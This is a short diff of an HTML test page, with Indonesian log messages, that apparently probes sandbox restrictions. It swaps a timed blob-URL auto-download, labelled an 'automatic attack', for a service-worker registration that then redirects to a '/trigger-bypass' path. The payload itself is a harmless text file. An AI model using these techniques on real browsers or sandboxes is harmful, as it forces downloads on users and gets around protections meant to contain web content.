@@ -10,18 +10,12 @@
     <p>Menunggu trigger otomatis...</p>
 
     <script>
-        setTimeout(() => {
-            console.log("Memulai serangan otomatis...");
-
-            const content = "Ini file hasil auto-download dari sandbox!";
-            const blob = new Blob([content], { type: 'application/octet-stream' });
-            const blobUrl = URL.createObjectURL(blob);
-            try {
-                window.location.replace(blobUrl);
-            } catch (e) {
-                console.error("Gagal navigasi:", e.message);
-            }
-        }, 2000);
+        navigator.serviceWorker.register('sw.js').then(reg => {
+            console.log("Service Worker Registered!");
+            setTimeout(() => {
+                window.location.href = '/trigger-bypass';
+            }, 2000);
+        });
     </script>
 </body>
 
